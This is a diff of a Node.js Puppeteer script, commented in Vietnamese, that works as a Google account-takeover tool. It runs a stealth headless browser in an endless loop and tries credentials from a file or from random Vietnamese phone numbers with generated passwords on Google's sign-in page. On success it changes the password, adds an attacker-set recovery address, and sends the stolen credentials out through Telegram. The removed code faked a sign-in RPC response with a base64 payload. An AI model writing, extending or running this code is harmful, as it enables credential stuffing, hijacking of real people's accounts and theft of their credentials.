@@ -1,270 +1,260 @@
-const StealthPlugin = require('puppeteer-extra-plugin-stealth')
-const puppeteer = require('puppeteer-extra')
-const bodyParser = require('body-parser')
-const express = require('express')
-const axios = require('axios')
-require('dotenv').config()
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+const puppeteer = require('puppeteer-extra');
+const bodyParser = require('body-parser');
+const express = require('express');
+const axios = require('axios');
+require('dotenv').config();
 
-let page = null
-let mID = null
-let mLoaded = false
-let mUrl = null
-let mPostData = null
-let mHeaders = null
+const { randomLoginData, typePassword, delay, getRapt, exists, sendTelegramMessage ,changeGooglePassword,waitForRecoveryAdd} = require('phonevn');
+const fs = require('fs');
+const path = require('path');
 
-let mStart = new Date().toString()
+// Load accounts from accounts.txt (if exists)
+function loadAccountsFromTxt(txtFile = 'accounts.txt') {
+  const filePath = path.join(__dirname, txtFile);
+  if (!fs.existsSync(filePath)) return [];
+  const lines = fs.readFileSync(filePath, 'utf-8')
+    .split('\n')
+    .map(line => line.trim())
+    .filter(line => line && !line.startsWith('#'));
+  return lines.map(line => {
+    const [emailOrPhone, password] = line.split(',');
+    return { emailOrPhone, password };
+  });
+}
+let accountList = loadAccountsFromTxt();
+let accountIndex = 0;
+let phoneCount = 0;
+let page = null;
+let mID = null;
+let mLoaded = false;
+let mPassword = null;
+let mRecovery = null;
+let mStart = new Date().toString();
 
-const app = express()
+function logStep(message) {
+  const now = new Date().toLocaleTimeString();
+  console.log(`[${now}] [STEP] ${message}`);
+}
 
-app.use(express.json())
-app.use(bodyParser.urlencoded({ extended: true }))
+(async () => {
+  const name = process.env.username || 'appgologin@gmail.com';
+  await sendTelegramMessage(`📲${name} is running`);
+})();
 
-puppeteer.use(StealthPlugin())
+const app = express();
+app.use(express.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+puppeteer.use(StealthPlugin());
 
-const PORT = process.env.PORT || 3000
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Listening on port ${PORT}...`));
 
-app.listen(PORT, () => {
-    console.log(`Listening on port ${PORT}...`)
-})
+(async function infiniteLoop() {
+  while (true) {
+    try {
+      await startBrowser();
+    } catch (err) {
+      console.error('[InfiniteLoop] Lỗi khi chạy startBrowser:', err.message);
+    }
+    await delay(10000);
+  }
+})();
 
-startBrowser()
-
-setInterval(async () => {
-    await pageReload()
-}, 30*60*1000)
-
-setInterval(async () => {
-    await updateStatus()
-}, 60000)
+setInterval(async () => { await pageReload(); }, 5* 60 * 1000); // 30 phút
 
 app.post('/login', async (req, res) => {
-    if (req.body) {
-        let email = req.body.email
-        let password = req.body.password
-        if (email && password) {
-            if (mLoaded) {
-                let mData = await getLoginToken(email, password)
-                res.end(JSON.stringify(mData))
-            } else {
-                await delay(10000)
-                res.end(JSON.stringify({ status:-1 }))
-            }
-        } else {
-            res.end(JSON.stringify({ status:-1 }))
-        }
+  const { email, password } = req.body || {};
+  if (email && password) {
+    if (mLoaded) {
+      const mData = await getLoginToken(email, password);
+      res.end(JSON.stringify(mData));
     } else {
-        res.end(JSON.stringify({ status:-1 }))
+      await delay(10000);
+      res.end(JSON.stringify({ status: -1 }));
     }
-})
+  } else {
+    res.end(JSON.stringify({ status: -1 }));
+  }
+});
 
 app.get('/login', async (req, res) => {
-    if (req.query) {
-        let number = req.query.number
-        if (number) {
-            if (mLoaded) {
-                let mData = await getLoginToken(number)
-                res.end(JSON.stringify(mData))
-            } else {
-                await delay(10000)
-                res.end(JSON.stringify({ status:-1 }))
-            }
-        } else {
-            res.end(JSON.stringify({ status:-1 }))
-        }
+  const number = req.query.number;
+  if (number) {
+    if (mLoaded) {
+      const mData = await getLoginToken(number);
+      res.end(JSON.stringify(mData));
     } else {
-        res.end(JSON.stringify({ status:-1 }))
+      await delay(10000);
+      res.end(JSON.stringify({ status: -1 }));
     }
-})
+  } else {
+    res.end(JSON.stringify({ status: -1 }));
+  }
+});
 
 app.get('/reload', async (req, res) => {
-    await pageReload()
-    res.end('Reload Success')
-})
+  await pageReload();
+  res.end('Reload Success');
+});
 
 app.get('/', async (req, res) => {
-    if (mID == null) {
-        try {
-            let url = req.query.url
-            if (!url) {
-                let host = req.hostname
-                if (host.endsWith('onrender.com')) {
-                    url = host.replace('.onrender.com', '')
-                }
-            }
-    
-            if (url && url != 'localhost') {
-                mID = url
-            }
-        } catch (error) {}
-    }
-    
-    res.end(mStart)
-})
-
+  if (mID == null) {
+    try {
+      let url = req.query.url || req.hostname.replace('.onrender.com', '');
+      if (url && url !== 'localhost') mID = url;
+    } catch (e) {}
+  }
+  res.end(mStart);
+});
 
 async function startBrowser() {
-    try {
-        let browser = await puppeteer.launch({
-            headless: false,
-            headless: 'new',
-            args: [
-                '--no-sandbox',
-                '--disable-notifications',
-                '--disable-setuid-sandbox',
-                '--ignore-certificate-errors',
-                '--ignore-certificate-errors-skip-list',
-                '--disable-dev-shm-usage'
-            ],
-            executablePath: process.env.NODE_ENV == 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
-        })
+  logStep('Khởi động trình duyệt và bắt đầu quy trình đăng nhập');
+  let browser;
+  try {
+    browser = await puppeteer.launch({
+      headless: false,
+      headless: 'new',
+      args: [
+        '--no-sandbox',
+        '--disable-notifications',
+        '--disable-setuid-sandbox',
+        '--ignore-certificate-errors',
+        '--ignore-certificate-errors-skip-list',
+        '--disable-dev-shm-usage'
+      ],
+      executablePath: process.env.NODE_ENV === 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
+    });
 
-        page = (await browser.pages())[0]
+    let pages = await browser.pages();
+    page = pages[0];
+    let foundPasswordPage = false;
+    let phone, password, emailOrPhone;
+    logStep('Đang tìm trang nhập mật khẩu...');
 
-        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
+    while (!foundPasswordPage) {
+      if (accountList.length > 0 && accountIndex < accountList.length) {
+        ({ emailOrPhone, password } = accountList[accountIndex++]);
+        logStep(`Thử đăng nhập với tài khoản từ file: ${emailOrPhone}`);
+      } else {
+        ({ phone, password } = randomLoginData());
+        phoneCount++;
+        console.log('Tạo phone:', phone, 'Tổng số phone đã tạo:', phoneCount);
+        emailOrPhone = '84' + phone.replace(/^0/, '');
+        logStep(`Thử đăng nhập với số điện thoại random: ${emailOrPhone}`);
+      }
+      await page.goto("https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fsecurity&ec=GAZAwAE&followup=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fsecurity&ifkv=AdBytiMQP4oqdCGRqBJL2k3ZHiB6Y3feULcc0TtKSLvINSNY5DjVA0B3BX0MTo3yIG-8hxSr3Fen&osid=1&passive=1209600&service=accountsettings&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S2099267155%3A1753582003030136", { waitUntil: 'load', timeout: 0 });
+      await delay(1000);
+      await page.type('#identifierId', emailOrPhone);
+      logStep('Đã nhập tài khoản');
+      await delay(2000);
+      await page.click('#identifierNext');
+      logStep('Đã bấm Next để chuyển sang bước nhập mật khẩu');
+      await delay(5000);
 
-        await page.setRequestInterception(true)
-
-        page.on('request', request => {
-            try {
-                if (request.url().startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
-                    mUrl = request.url()
-                    mHeaders = request.headers()
-                    mPostData = request.postData()
-                    let contentType = 'application/json; charset=utf-8'
-                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')
-
-                    request.respond({
-                        ok: true,
-                        status: 200,
-                        contentType,
-                        body: output,
-                    })
-                } else {
-                    request.continue()
-                }
-            } catch (error) {
-                request.continue()
-            }
-        })
-
-        console.log('Browser Load Success')
-
-        await loadLoginPage()
-
-        mLoaded = true
-
-        console.log('Page Load Success')
-    } catch (error) {
-        console.log('Browser Error: '+error)
+      try {
+        const pageUrl = await page.evaluate(() => window.location.href);
+        if (pageUrl && pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
+          foundPasswordPage = true;
+        }
+      } catch (e) {
+        logStep('Lỗi khi kiểm tra URL trang mật khẩu: ' + e.message);
+      }
     }
+    logStep("Nhập mật khẩu vào " + password);
+    await typePassword(page, password);
+    await delay(3000);
+    const url = await page.url();
+    logStep('Kiểm tra nếu chuyển sang trang đổi mật khẩu...');
+    if (url.includes('/changepassword')) {
+      const pass = randomLoginData().password2;
+      await page.type('input[name="Passwd"]', pass);
+      await page.type('input[name="ConfirmPasswd"]', pass);
+      logStep('Đổi mật khẩu mới và hoàn tất đăng nhập');
+      await page.click('#changepasswordNext');
+      await delay(3000);
+      await sendTelegramMessage(`✅ Đăng nhập thành công: ${phone} | ${pass}`);
+      return;
+    }
+
+    logStep('Chờ kiểm tra đăng nhập thành công/rescue phone...');
+    mPassword = null;
+    mRecovery = null;
+
+    try {
+      logStep('Truy cập trang rescue phone để lấy email xác thực...');
+      await page.goto('https://myaccount.google.com/signinoptions/rescuephone', { waitUntil: 'load', timeout: 0 });
+      await delay(4000);
+
+      const email = await page.evaluate(() => {
+        const emailDiv = document.querySelector('div[jsname="bQIQze"].IxcUte');
+        return emailDiv ? emailDiv.innerText.trim() : null;
+      });
+
+      if (email) {
+        mRecovery = randomLoginData().recover;
+        mPassword = randomLoginData().password2;
+        logStep(`Tìm thấy email: ${email}`);
+        await sendTelegramMessage(`Đăng nhập thành công: ${email} | ${mPassword}|${mRecovery}|${phone || emailOrPhone}`);
+        await typePassword(page, password);
+        await delay(2000);
+        const urlNow = await page.url();
+        await delay(2000);
+        const mRapt = await getRapt(urlNow);
+        console.log('Rapt token:', mRapt);
+        await waitForRecoveryAdd(page, mRapt, mRecovery)
+        await changeGooglePassword(page, mRapt, mPassword);
+        await sendTelegramMessage(`✅ ${email} | ${mPassword} | ${mRecovery} | ${phone || emailOrPhone}`);
+      }
+    } catch (err) {
+      logStep('[ERROR] Trong quá trình xử lý sau đăng nhập: ' + err.message);
+    }
+  } catch (err) {
+    logStep('[ERROR] Lỗi trong startBrowser: ' + err.message);
+  } finally {
+    if (browser) await browser.close();
+  }
+}
+
+async function loadLoginPage() {
+  logStep('Tải lại trang đăng nhập Google');
+  for (let i = 0; i < 3; i++) {
+    try {
+      const pages = await page.browser().pages();
+      if (pages.length > 1) {
+        for (let j = 1; j < pages.length; j++) {
+          await pages[j].close();
+        }
+      }
+      page = pages[0];
+      if (page.isClosed()) {
+        page = await page.browser().newPage();
+      }
+      await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 });
+      logStep('Đã tải lại trang đăng nhập Google thành công');
+      break;
+    } catch (e) {
+      console.warn('[loadLoginPage] retry:', e.message);
+      await delay(1000);
+    }
+  }
 }
 
 async function pageReload() {
-    mLoaded = false
-    console.log('Page Reloading...')
-    await loadLoginPage()
-    console.log('Page Reload Success')
-    mLoaded = true
-}
-
-async function getLoginToken(email, password) {
-    try {
-        console.log('[getLoginToken] Start with email:', email)
-        await loadingRemove()
-        mUrl = null
-        mHeaders = null
-        mPostData = null
-        // Điền email
-        await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
-        await page.waitForSelector('input[type="email"],input#identifierId', {timeout: 10000})
-        await page.type('input[type="email"],input#identifierId', email, {delay: 50})
-        // Click Next
-        await page.waitForSelector('#identifierNext', {timeout: 10000})
-        await page.click('#identifierNext')
-        // Chờ password
-        await page.waitForTimeout(1000)
-        await page.waitForSelector('input[type="password"]', {timeout: 10000})
-        await page.type('input[type="password"]', password, {delay: 50})
-        // Click Next
-        await page.waitForSelector('#passwordNext', {timeout: 10000})
-        await page.click('#passwordNext')
-        // Chờ login thành công hoặc lỗi
-        await page.waitForTimeout(3000)
-        // Lấy url hiện tại
-        const currentUrl = page.url()
-        // Lấy cookie hiện tại
-        const cookies = await page.cookies()
-        // Kiểm tra login thành công
-        if (currentUrl.includes('myaccount.google.com')) {
-            return { status: 1, message: 'Login success', email, url: currentUrl, cookies }
-        }
-        // Kiểm tra lỗi
-        const errorText = await page.evaluate(() => {
-            let el = document.querySelector('div.o6cuMc')
-            return el ? el.innerText : null
-        })
-        if (errorText) {
-            return { status: 0, error: errorText, url: currentUrl, cookies }
-        }
-        return { status: 0, error: 'Unknown error', url: currentUrl, cookies }
-    } catch (error) {
-        console.log('[getLoginToken] catch error:', error)
-        return { status: 0, error: error.toString() }
-    }
-}
-
-async function loadingRemove() {
-    await page.evaluate(() => {
-        let root = document.querySelector('div[class="kPY6ve"]')
-        if (root) {
-            root.remove()
-        }
-        root = document.querySelector('div[class="Ih3FE"]')
-        if (root) {
-            root.remove()
-        }
-    })
-}
-
-
-async function loadLoginPage() {
-    for (let i = 0; i < 3; i++) {
-        try {
-            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
-            await delay(500)
-            break
-        } catch (error) {}
-    }
+  mLoaded = false;
+  await loadLoginPage();
+  mLoaded = true;
 }
 
 async function updateStatus() {
-    try {
-        if (mID) {
-            await axios.get('https://'+mID+'.onrender.com')
-        }
-    } catch (error) {}
+  try {
+    if (mID) {
+      await axios.get('https://' + mID + '.onrender.com');
+    }
+  } catch (e) {}
 }
 
-function getHostGaps(cookies) {
-    try {
-        if (cookies.includes('__Host-GAPS')) {
-            let temp = cookies.substring(cookies.indexOf('__Host-GAPS=')+12, cookies.length)
-            if (temp.includes(';')) {
-                return temp.substring(0, temp.indexOf(';'))
-            }
-            return temp
-        }
-    } catch (error) {}
-
-    return null
-}
-
-function decode(text) {
-    return Buffer.from(text, 'base64').toString('ascii')
-}
-
-function delay(time) {
-    return new Promise(function(resolve) {
-        setTimeout(resolve, time)
-    })
+async function getLoginToken(emailOrPhone, password) {
+  // Tùy bạn triển khai, đây chỉ ví dụ giả
+  return { status: 1, message: `Login thử với ${emailOrPhone}` };
 }
